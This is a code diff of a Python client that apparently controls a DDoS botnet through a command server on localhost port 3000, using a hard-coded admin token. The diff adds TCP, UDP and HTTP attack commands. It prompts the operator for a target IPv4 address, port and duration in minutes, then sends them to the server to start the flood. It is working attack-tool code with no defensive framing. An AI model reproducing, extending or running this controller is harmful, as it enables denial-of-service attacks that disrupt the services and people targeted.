@@ -1,8 +1,9 @@
 import requests
 import time
+import json
 
 SERVER_URL = "http://localhost"
-SERVER_PORT = 8080
+SERVER_PORT = 3000
 ADMIN_TOKEN = "AD2442e9471b2ff5376b5a70486379f7"
 
 RESET = "\033[0m"
@@ -24,10 +25,32 @@ def log(message: str, level="info"):
     }
     print(f"{colors.get(level, RESET)}[{level.upper()}] {message}{RESET}")
 
+def question_input(message: str):
+    return f"{YELLOW}[{CYAN}?{YELLOW}] {CYAN}{message}{RESET}"
+
+def get_info(key: str = None):
+    try:
+        req = requests.get(f'{SERVER_URL}:{SERVER_PORT}/info/get', headers=headers)
+
+        if req.status_code == 200:
+            data = req.json() 
+            
+            if key:
+                return data.get(key) 
+            
+            return data
+        else:
+            print(f"Error: {req.status_code} - {req.text}")
+            return None
+    except requests.RequestException as e:
+        print(f"Connection error: {e}")
+        return None
+
 def print_banner():
     ascii_art = f"""
     {YELLOW}[0] Tokens{RESET}
     {YELLOW}[1] Attack{RESET}
+    {YELLOW}[2] Get info{RESET}
     """
     print(ascii_art)
 
@@ -93,25 +116,15 @@ def attack():
     print(chr(27) + "[2J")
 
     status = {
-        'STOP': 2 << 0,
-        'TCP_ATTACK': 2 << 1,
-        'ACK_ATTACK': 2 << 2,
-        'IDLE': 2 << 5,
-        'EXIT': 2 << 6
+        'PING': 1 << 0,
+        'HELLO': 1 << 1,
+        'ATTACK_TCP': 1 << 2,
+        'ATTACK_UDP': 1 << 3,
+        'ATTACK_HTTP': 1 << 4,
+        'EXIT': 1 << 5,
     }
 
     status_string = list(status.keys())
-
-    try:
-        req = requests.get(f'{SERVER_URL}:{SERVER_PORT}/polling', headers=headers)
-
-        value_to_find = int(req.text)
-        key = [k for k, v in status.items() if v == value_to_find]
-
-        log(f"[?] Current status: {YELLOW}{key}{RESET}", "info")
-    except requests.RequestException as e:
-        log(f"Error contacting server: {e}", "error")
-        return
 
     for i, state in enumerate(status_string):
         print(f"{BOLD}{CYAN}[{i}] {state}{RESET}")
@@ -127,10 +140,24 @@ def attack():
     selected_status = status_string[attack_opt]
     status_code = status[selected_status]
 
+    duration = 1
+    targetIp = "0.0.0.0"
+    targetPort = 1
+
+    if "ATTACK" in selected_status:
+        duration = int(input(question_input("Insert attack duration (minutes): ")))
+        targetIp = input(question_input("Insert target host (Ipv4 Addr): "))
+        targetPort = int(input(question_input("Insert target port: ")))
+
     try:
-        req = requests.post(f'{SERVER_URL}:{SERVER_PORT}/queue/set/{status_code}', headers=headers)
+        req = requests.post(f'{SERVER_URL}:{SERVER_PORT}/command/run/{status_code}', headers=headers, json={
+        'duration': duration,
+        'targetIp': targetIp,
+        'targetPort': targetPort,
+    })
+
         if req.status_code == 200:
-            log(f"Successfully set status to {GREEN}{selected_status}{RESET}.", "success")
+            log(f"Successfully started command: {GREEN}{selected_status}{RESET}.", "success")
         else:
             log(f"Error setting status: {req.text}", "error")
     except requests.RequestException as e:
@@ -153,6 +180,9 @@ def main():
                 token_choose()
             case 1:
                 attack()
+                break
+            case 2:
+                print(get_info())
                 break
             case _:
                 log("Invalid option selected!", "error")
